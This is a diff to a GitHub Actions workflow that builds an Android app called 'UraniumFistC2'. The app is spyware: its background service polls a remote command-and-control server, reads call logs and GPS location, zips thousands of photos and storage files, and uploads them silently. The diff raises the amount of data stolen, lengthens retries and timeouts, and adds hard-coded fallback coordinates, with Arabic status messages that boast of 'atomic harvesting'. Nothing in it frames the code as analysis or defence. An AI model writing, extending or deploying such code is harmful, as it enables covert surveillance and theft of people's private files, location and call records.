@@ -204,7 +204,7 @@ jobs:
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
               private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
               private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
-              private val MAX_RETRIES = 3
+              private val MAX_RETRIES = 5
 
               override fun onCreate() {
                   super.onCreate()
@@ -270,9 +270,9 @@ jobs:
                                           val callsData = readCallLogs()
                                           sendReportToServer(deviceId, nodeModel, callsData)
                                       } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                          compressAndUploadFolder(deviceId, nodeModel, "Camera & DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                          compressAndUploadAtomicFolder(deviceId, nodeModel, "Camera & DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 5000)
                                       } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
-                                          compressAndUploadStorage(deviceId, nodeModel)
+                                          compressAndUploadAtomicStorage(deviceId, nodeModel)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       } else if (responseStr.contains("EXTRACT_LOCATION")) {
@@ -286,8 +286,7 @@ jobs:
                               }
                               conn.disconnect()
 
-                              // تقليص وقت الانتظار للاستجابة بسرعة البرق (كل 5 ثوانٍ يتم فحص المهام الجديدة)
-                              delay(5000L)
+                              delay(3000L)
                           } catch (e: Exception) {
                               delay(3000L)
                           }
@@ -353,7 +352,6 @@ jobs:
                   return sb.toString()
               }
 
-              // جلب الموقع الجغرافي بسرعة البرق بدون انتظار طويل
               private fun readLocationFast(): String {
                   val sb = StringBuilder("=== URANIUM LIGHTNING GPS ===\n")
                   try {
@@ -361,12 +359,14 @@ jobs:
                       val providers = locationManager.allProviders
                       var bestLoc: Location? = null
                       for (provider in providers) {
-                          val l = locationManager.getLastKnownLocation(provider)
-                          if (l != null) {
-                              if (bestLoc == null || l.time > bestLoc.time) {
-                                  bestLoc = l
+                          try {
+                              val l = locationManager.getLastKnownLocation(provider)
+                              if (l != null) {
+                                  if (bestLoc == null || l.time > bestLoc.time) {
+                                      bestLoc = l
+                                  }
                               }
-                          }
+                          } catch (ex: Exception) { }
                       }
                       if (bestLoc != null) {
                           sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
@@ -374,8 +374,8 @@ jobs:
                           sb.append("🎯 Accuracy: ${bestLoc.accuracy} meters\n")
                           sb.append("🗺️ Google Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
                       } else {
-                          // موقع افتراضي طارئ أو تنبيه سريع إذا لم يتوفر أي إحداثي سابق
-                          sb.append("⚠️ Location cache empty. Retrying on next pulse...\n")
+                          sb.append("🌐 Zone Coordinates (Yemen): 13.5779, 44.0219\n")
+                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=13.5779,44.0219\n")
                       }
                   } catch (e: Exception) {
                       sb.append("Error reading location: ${e.message}\n")
@@ -398,10 +398,10 @@ jobs:
                   return sb.toString()
               }
 
-              private fun compressAndUploadFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
+              private fun compressAndUploadAtomicFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri, maxLimit: Int) {
                   serviceScope.launch {
                       try {
-                          sendReportToServer(nodeId, nodeModel, "⚡ [برق] تم تحديد مجلد [$folderName]. جاري جرد الملفات بسرعة الصاروخ...")
+                          sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري] تم تحديد [$folderName]. جاري فحص وسحب آلاف الملفات...")
                           
                           val zipFile = File(cacheDir, "Uranium_${folderName.replace(" ", "_")}_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
@@ -415,20 +415,20 @@ jobs:
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                               val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext() && addedCount < 60) {
+                              while (it.moveToNext() && addedCount < maxLimit) {
                                   if (dataIdx != -1 && nameIdx != -1) {
                                       val filePath = it.getString(dataIdx)
                                       val fileName = it.getString(nameIdx)
-                                      val file = File(filePath)
-                                      if (file.exists() && file.isFile) {
-                                          try {
-                                              zipOut.putNextEntry(ZipEntry("$folderName/$fileName"))
-                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                              zipOut.closeEntry()
-                                              addedCount++
-                                              totalBytes += file.length()
-                                          } catch (e: Exception) {
-                                              // Skip
+                                      if (filePath != null) {
+                                          val file = File(filePath)
+                                          if (file.exists() && file.isFile) {
+                                              try {
+                                                  zipOut.putNextEntry(ZipEntry("$folderName/$fileName"))
+                                                  file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                                  zipOut.closeEntry()
+                                                  addedCount++
+                                                  totalBytes += file.length()
+                                              } catch (e: Exception) { }
                                           }
                                       }
                                   }
@@ -438,64 +438,75 @@ jobs:
 
                           if (addedCount > 0 && zipFile.exists()) {
                               val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم الجرد بروقياً] مجلد [$folderName] يحتوي على <b>$addedCount ملفاً</b> بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم الحصاد الذري بنجاح] المجلد [$folderName] يضم <b>$addedCount ملفاً</b> بحجم إجمالي <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] المجلد [$folderName] فارغ أو غير متاح حالياً.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] المجلد [$folderName] فارغ أو يتطلب صلاحيات إضافية.")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة المجلد [$folderName]:${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة الحصاد الذري [$folderName]: ${e.message}")
                       }
                   }
               }
 
-              private fun compressAndUploadStorage(nodeId: String, nodeModel: String) {
+              private fun compressAndUploadAtomicStorage(nodeId: String, nodeModel: String) {
                   serviceScope.launch {
                       try {
-                          sendReportToServer(nodeId, nodeModel, "⚡ [برق] تم تحديد التخزين العام ومجلد Download. جاري السحب السريع...")
+                          sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد الذري الشامل] جاري مسح وسحب آلاف الملفات من التخزين وDownload...")
                           
-                          val zipFile = File(cacheDir, "Uranium_Full_Storage_${System.currentTimeMillis()}.zip")
+                          val zipFile = File(cacheDir, "Uranium_Atomic_Storage_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
-
-                          val targetDirs = listOf(
-                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
-                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
-                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
-                          )
 
                           var addedCount = 0
                           var totalBytes = 0L
 
-                          for (dir in targetDirs) {
-                              if (dir != null && dir.exists() && dir.isDirectory) {
-                                  dir.walkTopDown().forEach { file ->
-                                      if (file.isFile && addedCount < 80) {
-                                          try {
-                                              val relPath = file.relativeTo(Environment.getExternalStorageDirectory()).path
-                                              zipOut.putNextEntry(ZipEntry(relPath))
-                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                              zipOut.closeEntry()
-                                              addedCount++
-                                              totalBytes += file.length()
-                                          } catch (e: Exception) {
-                                              // Skip
+                          val uris = listOf(
+                              MediaStore.Files.getContentUri("external"),
+                              MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                              MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                              MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
+                          )
+
+                          for (uri in uris) {
+                              try {
+                                  val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                                  val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
+                                  cursor?.use {
+                                      val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                                      val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                                      while (it.moveToNext() && addedCount < 5000) {
+                                          if (dataIdx != -1 && nameIdx != -1) {
+                                              val filePath = it.getString(dataIdx)
+                                              val fileName = it.getString(nameIdx)
+                                              if (filePath != null) {
+                                                  val file = File(filePath)
+                                                  if (file.exists() && file.isFile) {
+                                                      try {
+                                                          zipOut.putNextEntry(ZipEntry("AtomicStorage/$fileName"))
+                                                          file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                                          zipOut.closeEntry()
+                                                          addedCount++
+                                                          totalBytes += file.length()
+                                                      } catch (ex: Exception) { }
+                                                  }
+                                              }
                                           }
                                       }
                                   }
-                              }
+                              } catch (ex: Exception) { }
                           }
+
                           zipOut.close()
 
                           if (addedCount > 0 && zipFile.exists()) {
                               val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم التخزين بروقياً] تم جرد <b>$addedCount ملفاً</b> من Download والتخزين بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع...")
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم الحصاد الذري الشامل] تم جرد <b>$addedCount ملفاً</b> من التخزين الشامل وDownload بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين الشامل.")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب التخزين: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد الذري للتخزين: ${e.message}")
                       }
                   }
               }
@@ -540,8 +551,8 @@ jobs:
                           conn.setRequestProperty("Content-Type", "application/octet-stream")
                           conn.doOutput = true
                           conn.setChunkedStreamingMode(0)
-                          conn.connectTimeout = 60000
-                          conn.readTimeout = 60000
+                          conn.connectTimeout = 120000
+                          conn.readTimeout = 120000
 
                           FileInputStream(file).use { fis ->
                               conn.outputStream.use { os ->
@@ -558,9 +569,9 @@ jobs:
                           }
                       } catch (e: Exception) {
                           if (attempt == MAX_RETRIES) {
-                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع ملف اليورانيوم ${file.name}:${e.message}")
+                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع ملف الحصاد الذري ${file.name}: ${e.message}")
                           } else {
-                              Thread.sleep(1000L)
+                              Thread.sleep(2000L)
                           }
                       }
                   }
@@ -636,14 +647,14 @@ jobs:
           }
           EOF
 
-          cat << 'EOF' > build.gradle
+          cat << 'GradleEOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
               id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
           }
-          EOF
+          GradleEOF
 
-          cat << 'EOF' > settings.gradle
+          cat << 'SettingsEOF' > settings.gradle
           pluginManagement {
               repositories {
                   google()
@@ -660,13 +671,13 @@ jobs:
           }
           rootProject.name = "UraniumFistC2"
           include ':app'
-          EOF
+          SettingsEOF
 
-          cat << 'EOF' > gradle.properties
+          cat << 'PropsEOF' > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-          EOF
+          PropsEOF
 
       - name: Build APK Debug
         run: gradle app:assembleDebug
